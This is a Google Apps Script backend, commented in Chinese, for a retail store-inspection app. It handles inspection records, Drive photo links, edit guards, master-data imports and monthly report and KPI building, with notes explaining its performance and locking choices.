// links: { "路徑/資料夾":[{name, fileId}, ...], ... }；可分批多次呼叫，累加合併不覆蓋既有連結
/**
 * 把上傳完成的照片連結寫回紀錄。
 * deferShare=true 時「不做分享」—— 分享要對每張照片打三次 Drive API
 * （getFileById → 確認歸屬 → setSharing），19 張就是幾十次往返、實測佔掉好幾秒，
 * 而使用者是在等這一支回來才看到「已完成」。改由前端在背景另外呼叫 sharePhotoLinks。
 * 舊版前端不會帶這個參數，仍會同步分享（行為不變），所以後端先更新也不會壞。
 */
/*
 * 鎖內只讀「紀錄ID」一欄 + 命中那一列的照片JSON 一格。
 * 原本是 getDataRange().getValues()，把整張活頁讀進來（月底 1500 筆 × 23 欄、
 * 其中三個 JSON 欄各幾 KB，一次十幾 MB）—— 而 LockService 是整支腳本共用一把鎖，
 * 這支又是現場最頻繁的寫入路徑（每批照片傳完就回寫一次），
 * 於是每個人回寫照片時全系統都在等它，且會隨月份筆數持續惡化。
 * 做法與 submitRecord、getInspectedCodes、getChangeLog 一致：先問 getLastRow()，只取需要的範圍。
 */
function attachPhotoLinks(month, recordId, links, deferShare) {
  var lock = LockService.getScriptLock();
  lock.waitLock(20000);
  try {
    var sh = ssBook().getSheetByName('點檢紀錄_' + month);
    if (!sh) return { ok: false, message: '找不到月份活頁' };
    var lastRow = sh.getLastRow();
    if (lastRow < 2) return { ok: false, message: '找不到紀錄' };
    var head = sh.getRange(1, 1, 1, sh.getLastColumn()).getValues()[0];
    var idCol = head.indexOf('紀錄ID');
    var photoCol = head.indexOf('照片JSON');
    if (idCol < 0 || photoCol < 0) return { ok: false, message: '活頁缺少必要欄位' };
    var ids = sh.getRange(2, idCol + 1, lastRow - 1, 1).getValues();
    for (var i = 1; i <= ids.length; i++) {
      if (String(ids[i - 1][0]) !== String(recordId)) continue;
      var photos = safeJson(sh.getRange(i + 1, photoCol + 1).getValue());
      Object.keys(links || {}).forEach(function (key) {
        var arr = photos[key] || [];
        (links[key] || []).forEach(function (link) {
          var idx = -1;
          for (var j = 0; j < arr.length; j++) {
            var existingName = typeof arr[j] === 'string' ? arr[j] : arr[j].name;
            if (existingName === link.name) { idx = j; break; }
          }
          var entry = { name: link.name, fileId: link.fileId };
          if (idx >= 0) arr[idx] = entry; else arr.push(entry);
        });
        photos[key] = arr;
      });
      sh.getRange(i + 1, photoCol + 1).setValue(JSON.stringify(photos));
      // 同步狀態要跟著更新，否則補齊了還一直顯示「照片未齊」，主管就不會再信這個欄位
      var syncCol = head.indexOf('同步狀態');
      if (syncCol >= 0) sh.getRange(i + 1, syncCol + 1).setValue(syncStateOf(photos));
      // 報表(含客戶版)裡的照片連結要讓沒有 Google 帳號的人也能開 → 逐檔設為「知道連結可檢視」。
      // deferShare 時交給前端在背景另外呼叫，這一支就能立刻回來。
      if (deferShare === true) {
        return { ok: true, deferredShare: true, pending: photoPendingCount(photos) };
      }
      var share = shareLinkedPhotos(links);
      return { ok: true, shared: share.ok, shareFailed: share.failed, pending: photoPendingCount(photos) };
    }
    return { ok: false, message: '找不到紀錄' };
  } finally {
    SpreadsheetApp.flush();
    lock.releaseLock();
  }
}

/**
 * 補回某筆紀錄照片JSON裡缺少的 fileId。
 * 照片上傳完成後才會呼叫 attachPhotoLinks 回寫 fileId；若當下網路斷掉或使用者
 * 直接關閉頁面，照片其實已經在 Drive，但紀錄裡只剩檔名 —— 編輯時就顯示「無雲端連結」，
 * 報表裡也沒有連結。檔名是固定規則（店號_日期_題目_序號），所以能依「資料夾＋檔名」找回來。
 * 資料夾一律用 folderIdOfPath_()「只查不建」，不可以用 getUploadFolderId()：
 *   1 後者找不到就會建資料夾 —— 修復流程若真的找不到照片，會在 Drive 留下一堆空資料夾；
 *   2 後者會拿 script lock（waitLock 20000），逐個 key 查下來會把自己序列化甚至等到逾時；
 *   3 後者不排除垃圾桶裡的資料夾。
 * setup.gs 的整月修復 repairPhotoLinks() 用的也是 folderIdOfPath_，兩支修復要行為一致。
 */
function repairRecordPhotos(month, recordId) {
  var sh = ssBook().getSheetByName('點檢紀錄_' + month);
  if (!sh) return { ok: false, message: '找不到月份活頁' };
  var data = sh.getDataRange().getValues();
  var head = data[0];
  var idCol = head.indexOf('紀錄ID'), photoCol = head.indexOf('照片JSON');
  var at = -1;
  for (var i = 1; i < data.length; i++) { if (String(data[i][idCol]) === String(recordId)) { at = i; break; } }
  if (at < 0) return { ok: false, message: '找不到紀錄' };

  var photos = safeJson(data[at][photoCol]);
  var links = {}, filled = 0, missing = 0;
  Object.keys(photos).forEach(function (key) {
    var folderId = null;   // 同一個資料夾只查一次
    (photos[key] || []).forEach(function (e) {
      var name = (typeof e === 'string') ? e : (e && e.name);
      if (!name || (e && e.fileId)) return;               // 已經有 fileId 就跳過
      if (folderId === null) folderId = folderIdOfPath_(key);   // 吃「資料夾/子資料夾」路徑字串，自己會 split
      var fid = folderId ? findFileIdByName(folderId, name) : '';
      if (!fid) { missing++; return; }                    // Drive 裡真的沒有這張（可能當時根本沒上傳成功）
      if (!links[key]) links[key] = [];
      links[key].push({ name: name, fileId: fid });
      filled++;
    });
  });
  if (!filled) return { ok: true, filled: 0, missing: missing };
  var res = attachPhotoLinks(month, recordId, links);
  return { ok: res.ok !== false, filled: filled, missing: missing, message: res.message };
}

/**
 * 本月已點檢的店號清單（防重複點檢用）。
 * 為什麼要獨立一支：前端原本呼叫 queryRecords(month, {}) 取「全部紀錄」，
 * 但它只用得到 storeCode 一個欄位 —— 而 queryRecords 會讀整張活頁、把每一列的
 * 明細JSON／觀察JSON／照片JSON 全部 parse 再整包傳到瀏覽器。
 * 月底上千筆、每筆帶幾十張照片連結時，這是好幾 MB 的浪費，而且每次開 App 都做一次。
 * 這裡只讀「店號」一欄。
 */
/**
 * 這筆紀錄是否已經寫進後端？只讀「紀錄ID」一欄。
 *
 * 為什麼要獨立一支：待送佇列在重送前要先確認「是不是其實已經送成功、只是回應遺失」，
 * 原本是呼叫 queryRecords(month, {from:day, to:day}) —— 但 queryRecords 的第一行是
 * readSheet(整張活頁)，from/to 是讀完才過濾的，完全沒有減少讀取量。
 * 月底 200 多筆、每筆帶三個大 JSON 欄，一次十幾 MB；而送出逾時的人越多、
 * 待送佇列越多、這種全表讀取就越頻繁 —— 後端被自己的重試機制拖垮。
 * 2026-08-28 現場多人同時卡住時就是這個形狀。
 *
 * 這支不拿鎖：只是讀一欄做判斷，就算和寫入並行、最壞情況也只是回報「還沒有」，
 * 而 submitRecord 本身是等冪的（同一個紀錄ID 不會寫成兩列），所以沒有正確性風險。
 */
function recordExists(month, id) {
  var sh = ssBook().getSheetByName('點檢紀錄_' + month);
  if (!sh) return { exists: false };
  var lastRow = sh.getLastRow();
  if (lastRow < 2) return { exists: false };
  var head = sh.getRange(1, 1, 1, sh.getLastColumn()).getValues()[0];
  var col = head.indexOf('紀錄ID');
  if (col < 0) return { exists: false };
  var target = String(id == null ? '' : id);
  if (!target) return { exists: false };
  var ids = sh.getRange(2, col + 1, lastRow - 1, 1).getValues();
  for (var i = 0; i < ids.length; i++) {
    if (String(ids[i][0]) === target) return { exists: true };
  }
  return { exists: false };
}

function getInspectedCodes(month) {
  var sh = ssBook().getSheetByName('點檢紀錄_' + month);
  if (!sh) return { codes: [] };
  var lastRow = sh.getLastRow();
  if (lastRow < 2) return { codes: [] };
  var head = sh.getRange(1, 1, 1, sh.getLastColumn()).getValues()[0];
  var col = head.indexOf('店號');
  if (col < 0) return { codes: [] };
  var vals = sh.getRange(2, col + 1, lastRow - 1, 1).getValues();
  var out = [];
  for (var i = 0; i < vals.length; i++) {
    var c = normCode(vals[i][0]);
    if (c) out.push(c);   // 已正規化（去前導0），前端可直接比對
  }
  return { codes: out };
}

/**
 * 只做「把照片設為知道連結就能看」。由前端在連結寫回成功之後於背景呼叫，
 * 所以使用者不必等這幾秒。歸屬驗證在 shareLinkedPhotos 裡（只動照片根目錄底下的檔案），
 * 前端傳進來的 fileId 不會因此獲得任何額外權限。
 */
function sharePhotoLinks(links) {
  var r = shareLinkedPhotos(links);
  return { ok: true, shared: r.ok, failed: r.failed };
}

function queryRecords(month, filter) {
  filter = filter || {};
  var rows = readSheet('點檢紀錄_' + month);
  return rows.filter(function (r) {
    var d = toYmd(r['點檢時間']);
    if (filter.from && d < filter.from) return false;
    if (filter.to && d > filter.to) return false;
    if (filter.section && String(r['課別']) !== filter.section) return false;
    if (filter.empId && String(r['員編']) !== filter.empId) return false;
    return true;
  }).map(rowToRecord);
}

function updateRecord(month, id, rec, pass, who) {
  var lock = LockService.getScriptLock();
  lock.waitLock(20000);
  try {
    var sh = ssBook().getSheetByName('點檢紀錄_' + month);
    var data = sh.getDataRange().getValues();
    var head = data[0];
    var idCol = head.indexOf('紀錄ID');
    for (var i = 1; i < data.length; i++) {
      if (String(data[i][idCol]) === String(id)) {
        var orig = rowObj(head, data[i]);
        // 非當週的紀錄要密碼才能改。用「原紀錄」的點檢時間判斷，不能用前端送來的 rec.time
        // —— 否則只要把時間改成本週就能繞過。
        var blocked = guardCrossWeek(toYmd(orig['點檢時間']), pass, who);
        if (blocked) return blocked;
        rec.id = id; rec.createdAt = orig['建立時間'] || nowStr(); rec.updatedAt = nowStr();
        var newRow = recordToRow(sh, rec); // rec 為前端英文鍵完整紀錄，直接覆寫
        sh.getRange(i + 1, 1, 1, newRow.length).setValues([newRow]);
        return { ok: true };
      }
    }
    return { ok: false, message: '找不到紀錄' };
  } finally {
    SpreadsheetApp.flush();
    lock.releaseLock();
  }
}

function deleteRecord(month, id, pass, who) {
  var lock = LockService.getScriptLock();
  lock.waitLock(20000);
  try {
    var sh = ssBook().getSheetByName('點檢紀錄_' + month);
    var data = sh.getDataRange().getValues();
    var idCol = data[0].indexOf('紀錄ID');
    for (var i = 1; i < data.length; i++) {
      if (String(data[i][idCol]) === String(id)) {
        var timeCol = data[0].indexOf('點檢時間');
        var blocked = guardCrossWeek(timeCol >= 0 ? toYmd(data[i][timeCol]) : '', pass, who);
        if (blocked) return blocked;
        sh.deleteRow(i + 1);
        return { ok: true };
      }
    }
    return { ok: false, message: '找不到紀錄' };
  } finally {
    SpreadsheetApp.flush();
    lock.releaseLock();
  }
}

// ============================================================
// 彙總（依起訖日期 + 課別；回執行店數與明細）
// ============================================================
function getSummary(month, filter) {
  var recs = queryRecords(month, filter);
  var pass = Number(getSetting('及格分數') || 85);
  return {
    count: recs.length,
    avg: recs.length ? Math.round(recs.reduce(function (s, r) { return s + Number(r.total || 0); }, 0) / recs.length) : 0,
    passRate: recs.length ? Math.round(recs.filter(function (r) { return Number(r.total) >= pass; }).length / recs.length * 100) : 0,
    records: recs,
  };
}

// ============================================================
// 月報表（課長版/客戶版 共用資料）
//   把 點檢紀錄_月 的 JSON 明細攤平成「每題一欄」的主表列，
//   加上部/課/擔當查找與依課別的 KPI 彙總，交給前端組成 xlsx。
// ============================================================
function buildMonthlyReport(month, filter, isManager) {
  var checklist = getChecklist(month);
  var records = queryRecords(month, filter);
  var roster = readSheet('店鋪名單_' + month);
  var storesMaster = readSheet('店鋪主檔');
  var staffList = readSheet('點檢人員');
  var pass = Number(getSetting('及格分數') || 85);

  var obsRows = readSheet('觀察題_' + month);
  var obsList = obsRows.map(function (r) {
    return {
      id: r['編號'], type: r['類型'], name: r['題目名稱'],
      options: String(r['選項'] || '').split('|').filter(Boolean),
      showIf: r['顯示條件'] || '', required: r['必填'] === '是', order: Number(r['排序']) || 0,
    };
  }).sort(function (a, b) { return a.order - b.order; });

  // 部/課對照（來自點檢人員主檔，去重）
  var deptSectionSeen = {}, deptSectionList = [];
  staffList.forEach(function (r) {
    var dept = r['部別'], sect = r['課別'];
    if (!dept || !sect) return;
    var key = dept + '|' + sect;
    if (deptSectionSeen[key]) return;
    deptSectionSeen[key] = true;
    deptSectionList.push({ 部: dept, 課: sect });
  });

  // 店號可能因店鋪重新編號而新舊不一(同一家店在名單/主檔各存不同店號)，比對店鋪主檔一律以店名為主、店號僅作備援
  var masterByCode = {}, masterByName = {}, rosterByCode = {};
  storesMaster.forEach(function (r) {
    masterByCode[normCode(r['店號'])] = r;
    var nm = normName(r['店名']); if (nm) masterByName[nm] = r;
  });
  roster.forEach(function (r) { rosterByCode[normCode(r['店號'])] = r; });
  var findMaster = function (code, name) { return masterByName[normName(name)] || masterByCode[normCode(code)] || {}; };

  // 依大分類分組題目，供小計與欄位排序用
  var catOrder = [], catItems = {};
  checklist.forEach(function (it) {
    if (!catItems[it.cat]) { catItems[it.cat] = []; catOrder.push(it.cat); }
    catItems[it.cat].push(it);
  });

  var batchPeriods = getBatchPeriods(month);   // 每月不同，隨名單匯入；沒有就退回舊行為
  var rows = records.map(function (rec, idx) {
    var code = normCode(rec.storeCode);
    var sm = findMaster(rec.storeCode, rec.storeName);
    var ro = rosterByCode[code] || {};
    var itemScores = {}, itemExtra = {};
    checklist.forEach(function (it) {
      var d = (rec.detail || {})[it.id];
      itemScores[it.id] = d && d.score != null ? d.score : it.max;
      // 缺失子項的文字：
      //   一般子項（口巧、TM前貨架…）→ 直接用子項名稱
      //   「填寫型」子項（如 其他貨架:填寫）→ 只呈現人工key入的名稱，不要再輸出「其他貨架」這個標籤本身
      //     （原本是兩者都輸出，會變成「其他貨架、報架，其他」，人工版只需要「報架，其他」）
      var labels = [];
      var ngSubs = (d && d.ngSubs) || [];
      var customNames = (d && d.customNames) || {};
      ngSubs.forEach(function (nm) {
        var typed = customNames[nm];
        labels.push(typed ? String(typed) : String(nm));
      });
      // 這裡原本還有一段「有填了名稱但子項沒被勾選也要呈現」的保險，註解寫著「理論上不會發生」。
      // 它其實會發生：取消勾選時前端不會清掉已輸入的文字，那段文字就成了畫面上看不到、
      // 卻仍存在紀錄裡的隱藏資料 —— 於是報表列出那幾個貨架是缺失，分數卻完全沒扣到它們，
      // 拿報表核對得分就是核不出來。2026-08-27 移除，並在前端改為取消勾選即清掉文字：
      // 分數與報表只有一個真相來源，就是「勾選狀態」。
      if (labels.length) itemExtra[it.id] = labels.join('、');
    });
    var catSubtotal = {};
    catOrder.forEach(function (cat) {
      catSubtotal[cat] = catItems[cat].reduce(function (s, it) { return s + (itemScores[it.id] != null ? itemScores[it.id] : it.max); }, 0);
    });
    // 照片群組：key 去掉開頭的月份資料夾(每筆都一樣)，剩下的路徑當作題目/區域的識別鍵；
    // 只回傳已回寫雲端連結的照片(尚未回寫/舊資料的純檔名項目會被過濾掉，不會出現空連結)
    var photoGroups = {};
    Object.keys(rec.photos || {}).forEach(function (key) {
      var groupKey = key.split('/').slice(1).join('/');
      var urls = photoUrlsOf(rec.photos[key]);
      if (urls.length) photoGroups[groupKey] = urls;
    });
    return {
      序: idx + 1,
      營業部: sm['營業部名稱'] || '', 營業課別: sm['營業課名稱'] || '', 營業擔當: sm['營業擔當'] || '',
      店號: rec.storeCode, 店名: rec.storeName, 點檢時間: rec.time, 建立時間: rec.createdAt || '',
      itemScores: itemScores, itemExtra: itemExtra, 分類小計: catSubtotal,
      合計: Number(rec.total), 等第: rec.grade,
      主責部: rec.dept || '', 主責課: rec.section || '',
      點檢人員: rec.staffName, 在店人數: rec.staffCount, 身分別: rec.identity,
      備註: rec.note || '', 店型態: ro['店鋪型態'] || '一般店', 拍照類型: rec.storeType,
      遠程店: ro['遠程店'] || '否', 假日店: ro['假日店'] || '否',
      // 梯次一律以實際點檢日期落在哪一段區間為準；算不出來(沒有梯次表)才退回名單的預排。
      // 原本的預排另存 原預排梯次，梯次表的「預計」側仍用它，才看得出脫期。
      預排梯次: batchOfDate(batchPeriods, toYmd(rec.time)) || ro['預排梯次'] || '',
      原預排梯次: ro['預排梯次'] || '',
      實際梯次: batchOfDate(batchPeriods, toYmd(rec.time)),
      觀察: rec.observation || {}, photoGroups: photoGroups,
    };
  });

  // 依課別 KPI 彙總（應點檢=名單配額；已點檢=實際送出）
  var byDept = {};
  var ensureDept = function (sect) { if (!byDept[sect]) byDept[sect] = { 課別: sect, 應點檢: 0, 已點檢: 0, scores: [], 不及格店: [] }; return byDept[sect]; };
  roster.forEach(function (r) { ensureDept(r['課別'] || '(未分類)').應點檢++; });
  rows.forEach(function (r) {
    var d = ensureDept(r.主責課 || '(未分類)');
    d.已點檢++; d.scores.push(r.合計);
    if (r.合計 < pass) d.不及格店.push(r.店名);
  });
  var kpi = Object.keys(byDept).sort().map(function (sect) {
    var d = byDept[sect];
    var passCount = d.scores.filter(function (s) { return s >= pass; }).length;
    return {
      課別: d.課別, 應點檢: d.應點檢, 已點檢: d.已點檢, 未點檢: d.應點檢 - d.已點檢,
      完成率: d.應點檢 ? Math.round(d.已點檢 / d.應點檢 * 100) + '%' : '-',
      合格家數: passCount, 不合格家數: d.已點檢 - passCount,
      合格率: d.已點檢 ? Math.round(passCount / d.已點檢 * 100) + '%' : '-',
      平均分: d.scores.length ? Math.round(d.scores.reduce(function (a, b) { return a + b; }, 0) / d.scores.length) : '-',
      最高分: d.scores.length ? Math.max.apply(null, d.scores) : '-',
      最低分: d.scores.length ? Math.min.apply(null, d.scores) : '-',
      不及格店: d.不及格店.join('、'),
    };
  });

  return {
    passScore: pass,
    pricing: isManager ? getPricing() : null, // 請款單價只給管理者（請款金額限管理者產出）
    checklist: checklist.map(function (it) { return { id: it.id, name: it.name, cat: it.cat, max: it.max, type: it.type }; }),
    obsList: obsList,
    deptSectionList: deptSectionList,
    catOrder: catOrder,
    rows: rows,
    kpi: kpi,
    batchPeriods: batchPeriods,
    roster: roster.map(function (r) {
      var sm = findMaster(r['店號'], r['店名']);
      return {
        店號: r['店號'], 店名: r['店名'], 課別: r['課別'], 店鋪型態: r['店鋪型態'],
        遠程店: r['遠程店'], 假日店: r['假日店'], 預排梯次: r['預排梯次'],
        // 營業組織（部/課/擔當）一律取自店鋪主檔，跟 SQC 的「主責課」是兩回事：
        // 主責課＝這個月由哪一課負責盤點（來自店鋪名單的課別），會因實際點檢而改變。
        營業部: sm['營業部名稱'] || '', 營業課: sm['營業課名稱'] || '',
        營業擔當: sm['營業擔當'] || '', 地址: sm['地址'] || '',
      };
    }),
  };
}

// ============================================================
// 維護專區：匯入（前端解析檔案後傳 rows；同名覆蓋＝整表以最新取代）
// ============================================================
function importMaster(kind, month, rows, fileName, batches) {
  var lock = LockService.getScriptLock();
  lock.waitLock(30000);
  try {
    var map = {
      'staff': '點檢人員', 'stores': '店鋪主檔',
      'roster': '店鋪名單_' + month, 'checklist': '題庫_' + month, 'obs': '觀察題_' + month,
    };
    if (!map[kind]) throw new Error('未知匯入類型：' + kind);
    var sh = ensureKindSheet(kind, month); // 缺活頁自動建立
    var head = sh.getRange(1, 1, 1, sh.getLastColumn()).getValues()[0];
    // 清空舊資料（保留表頭）→ 以最新上傳為主
    if (sh.getLastRow() > 1) sh.getRange(2, 1, sh.getLastRow() - 1, head.length).clearContent();
    var out = rows.map(function (r) { return head.map(function (h) { return r[h] != null ? String(r[h]) : ''; }); });
    if (out.length) {
      var rng = sh.getRange(2, 1, out.length, head.length);
      rng.setNumberFormat('@'); // 全部存成文字，避免店號/工號等掉前導0、日期被轉型
      rng.setValues(out);
    }
    setSetting('匯入_' + kind, (fileName || '') + ' @ ' + nowStr());
    // 店鋪名單檔右側附帶「梯次/評核日期區間」小表時一併存下，供依實際日期反推梯次
    var batchCount = (kind === 'roster' && batches && batches.length) ? saveBatchPeriods(month, batches) : 0;
    return { ok: true, count: out.length, batchCount: batchCount };
  } finally {
    SpreadsheetApp.flush();
    lock.releaseLock();
  }
}

// ============================================================
// 題庫單題 新增/修改/刪除（item 以中文表頭為鍵）
// ============================================================
function upsertItem(month, item) {
  var lock = LockService.getScriptLock(); lock.waitLock(20000);
  try {
    var sh = ssBook().getSheetByName('題庫_' + month);
    if (!sh) throw new Error('找不到活頁：題庫_' + month);
    var head = sh.getRange(1, 1, 1, sh.getLastColumn()).getValues()[0];
    var row = head.map(function (h) { return safeCell_(item[h] != null ? item[h] : ''); });
    var data = sh.getDataRange().getValues();
    var idCol = head.indexOf('編號');
    for (var i = 1; i < data.length; i++) {
      if (String(data[i][idCol]) === String(item['編號'])) {
        sh.getRange(i + 1, 1, 1, head.length).setValues([row]);
        return { ok: true, mode: 'update' };
      }
    }
    sh.appendRow(row);
    return { ok: true, mode: 'add' };
  } finally { SpreadsheetApp.flush(); lock.releaseLock(); }
}

function deleteItem(month, id) {
  var lock = LockService.getScriptLock(); lock.waitLock(20000);
  try {
    var sh = ssBook().getSheetByName('題庫_' + month);
    var data = sh.getDataRange().getValues();
    var idCol = data[0].indexOf('編號');
    for (var i = 1; i < data.length; i++) {
      if (String(data[i][idCol]) === String(id)) { sh.deleteRow(i + 1); return { ok: true }; }
    }
    return { ok: false, message: '找不到題目' };
  } finally { SpreadsheetApp.flush(); lock.releaseLock(); }
}

// ============================================================
// 通用單筆 新增/修改/刪除（各區共用；row 以中文表頭為鍵）
//   kind: checklist/obs/roster/staff/stores
// ============================================================
function sheetForKind(kind, month) {
  return { checklist: '題庫_' + month, obs: '觀察題_' + month, roster: '店鋪名單_' + month, staff: '點檢人員', stores: '店鋪主檔' }[kind];
}
function keyForKind(kind) {
  return { checklist: '編號', obs: '編號', roster: '店號', staff: '工號', stores: '店號' }[kind];
}

// 各活頁表頭（缺活頁時自動建立用；與 setup.gs 保持一致）
var HEADERS_MAP = {
  checklist: ['排序', '編號', '大分類', '題號名稱', '配分', '計分方式', '每項扣分', '子項清單', '規範說明'],
  obs: ['排序', '編號', '類型', '題目名稱', '選項', '顯示條件', '必填'],
  roster: ['店號', '店名', '課別', '店鋪型態', '遠程店', '假日店', '預排梯次'],
  staff: ['部別', '課別', '工號', '姓名', '職稱', 'AD帳號', '角色'],
  stores: ['序號', '店號', '店名', '營業本部名稱', '營業部名稱', '營業課名稱', '營業擔當', '縣市', '鄉鎮', '地址'],
  record: ['紀錄ID', '點檢時間', '部別', '課別', '員編', '點檢人員', '店號', '店名', '店鋪型態', '備註', '題庫版本', '合計得分', '等第', '在店店員人數', '簽名身分別', '明細JSON', '觀察JSON', '照片JSON', '紙本照片', '照片資料夾', '同步狀態', '建立時間', '更新時間'],
  log: ['時間', '操作人', '動作', '對象', '說明'],
  batch: ['梯次', '評核日期區間', '起日', '迄日'],
};
// 異動紀錄（維護區的編輯修改軌跡；單獨活頁）
function logChange(user, action, target, detail) {
  try {
    var sh = ensureSheetNamed('異動紀錄', HEADERS_MAP.log);
    sh.appendRow(safeRow_([nowStr(), user || '', action || '', target || '', detail || '']));
  } catch (e) { /* 記錄失敗不影響主流程 */ }
}
/** 最近 N 筆異動紀錄（新的在前）。
 *  只讀最後 N 列，不可以用 readSheet('異動紀錄') —— 那會把整張表讀進來，
 *  只為了 slice 出最後 300 筆。這張表是常駐的、有兩個寫入來源（維護區的修改/刪除軌跡，
 *  加上 logEvent），而且沒有清理機制，列數只會單向增加。
 *  與 submitRecord、getInspectedCodes 同一個做法：先問 getLastRow()，再只取需要的範圍。 */
function getChangeLog(limit) {
  limit = limit || 300;
  var sh = ssBook().getSheetByName('異動紀錄');
  if (!sh) return { rows: [] };
  var lastRow = sh.getLastRow();
  if (lastRow < 2) return { rows: [] };
  var lastCol = sh.getLastColumn();
  var head = sh.getRange(1, 1, 1, lastCol).getValues()[0];
  var n = Math.min(limit, lastRow - 1);
  var data = sh.getRange(lastRow - n + 1, 1, n, lastCol).getValues();
  var out = [];
  for (var i = data.length - 1; i >= 0; i--) {   // 直接倒著走，不必先 slice 再 reverse
    var r = rowObj(head, data[i]);
    out.push({ time: toDateTimeStr(r['時間']), user: r['操作人'], action: r['動作'], target: r['對象'], note: r['說明'] });
  }
  return { rows: out };
}
// 找不到活頁就自動建立（附表頭），回傳工作表
function ensureSheetNamed(name, headers) {
  var book = ssBook();
  var sh = book.getSheetByName(name);
  if (!sh) {
    sh = book.insertSheet(name);
    if (headers && headers.length) {
      sh.getRange(1, 1, 1, headers.length).setValues([headers]).setFontWeight('bold').setBackground('#334155').setFontColor('#ffffff');
      sh.setFrozenRows(1);
    }
  }
  return sh;
}
function ensureKindSheet(kind, month) { return ensureSheetNamed(sheetForKind(kind, month), HEADERS_MAP[kind]); }
// 建齊某月所有分月活頁（題庫/觀察題/店鋪名單/點檢紀錄）
function ensureMonth(month) {
  ensureKindSheet('checklist', month);
  ensureKindSheet('obs', month);
  ensureKindSheet('roster', month);
  ensureSheetNamed('點檢紀錄_' + month, HEADERS_MAP.record);
}
function upsertRow(kind, month, row) {
  var lock = LockService.getScriptLock(); lock.waitLock(20000);
  try {
    if (!sheetForKind(kind, month)) throw new Error('未知類型：' + kind);
    var sh = ensureKindSheet(kind, month); // 缺活頁自動建立
    var head = sh.getRange(1, 1, 1, sh.getLastColumn()).getValues()[0];
    var keyCol = keyForKind(kind);
    var out = head.map(function (h) { return row[h] != null ? String(row[h]) : ''; });
    var data = sh.getDataRange().getValues();
    var ci = head.indexOf(keyCol);
    var writeRow = function (rowIdx) { var rng = sh.getRange(rowIdx, 1, 1, head.length); rng.setNumberFormat('@'); rng.setValues([out]); };
    for (var i = 1; i < data.length; i++) {
      if (String(data[i][ci]) === String(row[keyCol]) && String(row[keyCol]) !== '') {
        writeRow(i + 1);
        return { ok: true, mode: 'update' };
      }
    }
    writeRow(sh.getLastRow() + 1);
    return { ok: true, mode: 'add' };
  } finally { SpreadsheetApp.flush(); lock.releaseLock(); }
}
function deleteRowByKind(kind, month, id) {
  var lock = LockService.getScriptLock(); lock.waitLock(20000);
  try {
    var sh = ssBook().getSheetByName(sheetForKind(kind, month));
    var data = sh.getDataRange().getValues();
    var ci = data[0].indexOf(keyForKind(kind));
    for (var i = 1; i < data.length; i++) {
      if (String(data[i][ci]) === String(id)) { sh.deleteRow(i + 1); return { ok: true }; }
    }
    return { ok: false, message: '找不到資料' };
  } finally { SpreadsheetApp.flush(); lock.releaseLock(); }
}

// ============================================================
// 工具
// ============================================================
// 一次請求裡會呼叫很多次（每個 readSheet 都要），openById 不必重複做。
// Apps Script 每次執行都是全新的 JS 環境，所以這個快取不會跨請求殘留。
var _book = null;
function ssBook() {
  if (!_book) _book = SpreadsheetApp.openById(SPREADSHEET_ID);
  return _book;
}

function readSheet(name) {
  var sh = ssBook().getSheetByName(name);
  if (!sh || sh.getLastRow() < 2) return [];
  var data = sh.getDataRange().getValues();
  var head = data[0];
  var out = [];
  for (var i = 1; i < data.length; i++) out.push(rowObj(head, data[i]));
  return out;
}
function rowObj(head, arr) { var o = {}; for (var j = 0; j < head.length; j++) o[head[j]] = arr[j]; return o; }

// 請款單價：一次讀「設定」活頁，未設定者用內建預設（與 js/billing.js 的預設一致）
function getPricing() {
  var rows = readSheet('設定');
  var map = {};
  rows.forEach(function (r) { map[String(r['參數'] || '').trim()] = r['值']; });
  var pick = function (key, dflt) { var v = Number(map[key]); return isNaN(v) || map[key] === '' || map[key] == null ? dflt : v; };
  return {
    平日點檢費: pick('平日點檢費', 245),
    平日遠程加價: pick('平日遠程加價', 220),
    假日點檢費: pick('假日點檢費', 470),
    假日遠程加價: pick('假日遠程加價', 345),
    文件處理費: pick('文件處理費', 6500),
    稅率: pick('稅率', 0.05),
  };
}

// ============================================================
// 梯次期間（每月不同，隨店鋪名單一起轉入）
//   名單檔右側有兩欄小表：「梯次 / 評核日期區間」，例如
//     第一梯  8/1-8/15
//     第二梯  8/16-8/31
//   有了期間就能用「實際點檢日期」反推實際梯次；實際與預排不符時，
//   報表一律以實際為準（見 buildMonthlyReport 的 實際梯次）。
// ============================================================

/** 存入某月的梯次期間（隨名單匯入寫入，覆蓋舊的） */
function saveBatchPeriods(month, list) {
  var name = '梯次_' + month;
  var sh = ensureSheetNamed(name, HEADERS_MAP.batch);
  if (sh.getLastRow() > 1) sh.getRange(2, 1, sh.getLastRow() - 1, HEADERS_MAP.batch.length).clearContent();
  var rows = (list || []).map(function (b) {
    var p = parseBatchRange(b.區間, month);
    return [String(b.梯次 || ''), String(b.區間 || ''), p.from, p.to];
  }).filter(function (r) { return r[0]; });
  if (rows.length) {
    var rng = sh.getRange(2, 1, rows.length, HEADERS_MAP.batch.length);
    rng.setNumberFormat('@');
    rng.setValues(rows);
  }
  return rows.length;
}

/** 讀某月的梯次期間 → [{name, from, to}]；沒有這張表就回空陣列（呼叫端要能退回舊行為） */
function getBatchPeriods(month) {
  var sh = ssBook().getSheetByName('梯次_' + month);
  if (!sh || sh.getLastRow() < 2) return [];
  return readSheet('梯次_' + month).map(function (r) {
    return { name: String(r['梯次'] || '').trim(), from: toYmd(r['起日']), to: toYmd(r['迄日']) };
  }).filter(function (b) { return b.name && b.from && b.to; });
}

/**
 * 把「8/1-8/15」這種區間轉成該月份的實際日期。
 * month 為民國年月（如 11508）→ 西元 2026 年 8 月。
 * 若起月大於迄月（如 12/16-1/15），視為跨年，迄日的年份 +1。
 */
function parseBatchRange(raw, month) {
  var s = String(raw == null ? '' : raw).replace(/\s/g, '');
  var m = s.match(/^(\d{1,2})[\/\-\.](\d{1,2})\s*[~\-—–]\s*(\d{1,2})[\/\-\.](\d{1,2})$/);
  if (!m) return { from: '', to: '' };
  var year = 1911 + Number(String(month).slice(0, 3));
  var m1 = Number(m[1]), d1 = Number(m[2]), m2 = Number(m[3]), d2 = Number(m[4]);
  var y2 = m2 < m1 ? year + 1 : year;                    // 跨年區間
  var pad = function (n) { return (n < 10 ? '0' : '') + n; };
  return { from: year + '-' + pad(m1) + '-' + pad(d1), to: y2 + '-' + pad(m2) + '-' + pad(d2) };
}

/** 該日期落在哪一個梯次；找不到回空字串 */
function batchOfDate(periods, ymd) {
  var d = String(ymd || '').slice(0, 10);
  if (!d) return '';
  for (var i = 0; i < (periods || []).length; i++) {
    var b = periods[i];
    if (d >= b.from && d <= b.to) return b.name;
  }
  return '';
}

// ============================================================
